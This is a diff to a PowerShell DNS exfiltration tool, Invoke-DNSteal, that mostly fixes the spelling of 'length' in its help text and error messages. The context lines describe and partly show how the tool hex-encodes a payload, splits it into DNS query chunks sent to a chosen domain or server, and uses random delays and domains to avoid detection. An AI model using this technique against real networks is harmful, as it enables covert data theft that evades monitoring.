@@ -35,18 +35,18 @@ function Show-Help {
 Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to exfiltrate data through DNS protocol"
 Write-Host "        and lets you control the size of queries using random delay"
 Write-Host
-Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\Invoke-DNSteal.ps1 -t target -p payload -l lenght" -ForegroundColor Blue 
+Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\Invoke-DNSteal.ps1 -t target -p payload -l length" -ForegroundColor Blue 
 Write-Host "         -s server -tcponly true/false -min 3000 -max 5000" -ForegroundColor Blue ; Write-Host ; Write-Host " Parameters: " -ForegroundColor Yellow 
 Write-Host "       · " -NoNewLine ; Write-Host "Target:      "-ForegroundColor Green -NoNewLine ; Write-Host "Domain target to exfiltrate data"
 Write-Host "       · " -NoNewLine ; Write-Host "Payload:     "-ForegroundColor Green -NoNewLine ; Write-Host "Payload to send over DNS chunks"
-Write-Host "       · " -NoNewLine ; Write-Host "Lenght:      "-ForegroundColor Green -NoNewLine ; Write-Host "Lenght of payload to control data size"
+Write-Host "       · " -NoNewLine ; Write-Host "Length:      "-ForegroundColor Green -NoNewLine ; Write-Host "Lenght of payload to control data size"
 Write-Host "       · " -NoNewLine ; Write-Host "Server:      "-ForegroundColor Green -NoNewLine ; Write-Host "Custom server to resolve DNS queries"
 Write-Host "       · " -NoNewLine ; Write-Host "TcpOnly:     "-ForegroundColor Green -NoNewLine ; Write-Host "Set TcpOnly to true or false "
 Write-Host "       · " -NoNewLine ; Write-Host "Delay Min:   "-ForegroundColor Green -NoNewLine ; Write-Host "Min delay time to do a query in ms"
 Write-Host "       · " -NoNewLine ; Write-Host "Delay Max:   "-ForegroundColor Green -NoNewLine ; Write-Host "Max delay time to do a query in ms"
 Write-Host "       · " -NoNewLine ; Write-Host "Random:      "-ForegroundColor Green -NoNewLine ; Write-Host "Use random domain name to avoid detection"
 Write-Host
-Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "The lenght (payload size) must be between 4 and 240"
+Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "The length (payload size) must be between 4 and 240"
 Write-Host "         " -NoNewLine ; Write-Host " The process time will increase depending on data size" ; Write-Host }
 
 # Errors
@@ -57,8 +57,8 @@ if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough p
 if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
 if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
 if ($args[5] -eq $null) { $DomainLength = 24 } else {
-if ($args[5] -lt 4) { Show-Banner ; Show-Help ; Write-Host "[!] Domain lenght is too short!" -ForegroundColor Red ; Write-Host ; break }}
-if ($args[5] -gt 240) { Show-Banner ; Show-Help ; Write-Host "[!] Domain lenght is too long!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[5] -lt 4) { Show-Banner ; Show-Help ; Write-Host "[!] Domain length is too short!" -ForegroundColor Red ; Write-Host ; break }}
+if ($args[5] -gt 240) { Show-Banner ; Show-Help ; Write-Host "[!] Domain length is too long!" -ForegroundColor Red ; Write-Host ; break }
 
 # Filters
 filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
@@ -84,7 +84,7 @@ if ($TcpOnly -in 'True') { $Protocol = 'TCP' } else { $Protocol = 'UDP' }
 
 $MaxChunk = $Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | Select -First 2 | Select -Last 1
 $MaxQuery = "$chunks.$query.$Target" ; if ($MaxQuery.Length -ge 80) { Show-Banner ; Show-Help
-Write-Host "[!] Domain lenght is too long!" -ForegroundColor Red ; Write-Host ; break } else {
+Write-Host "[!] Domain length is too long!" -ForegroundColor Red ; Write-Host ; break } else {
 Write-Host "[i] Sending $Bytes $ByteSize in $Chunks chunks over $Protocol on $Date" -ForegroundColor Blue ; Write-Host
 
 # Transmission Time
